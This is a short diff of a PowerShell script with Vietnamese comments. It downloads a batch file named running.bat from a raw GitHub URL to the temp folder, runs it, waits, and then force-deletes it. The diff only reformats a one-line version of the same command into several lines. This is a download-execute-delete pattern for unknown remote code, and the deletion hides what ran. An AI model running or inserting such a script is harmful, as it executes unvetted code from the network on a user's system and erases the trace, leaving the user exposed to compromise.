@@ -1,1 +1,11 @@
-powershell -Command "& { $temp = [System.IO.Path]::GetTempPath() + 'running.bat'; Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/mitukitii/test/main/running.bat' -OutFile $temp; Start-Process -FilePath $temp -Wait; Remove-Item -Path $temp -Force }"
+$TempPath = [System.IO.Path]::GetTempPath() + "running.bat"
+$URL = "https://raw.githubusercontent.com/mitukitii/test/main/running.bat"
+
+# Tải file về thư mục temp
+Invoke-WebRequest -Uri $URL -OutFile $TempPath
+
+# Chạy file .bat và chờ hoàn tất
+Start-Process -FilePath $TempPath -Wait
+
+# Xóa file sau khi chạy xong
+Remove-Item -Path $TempPath -Force
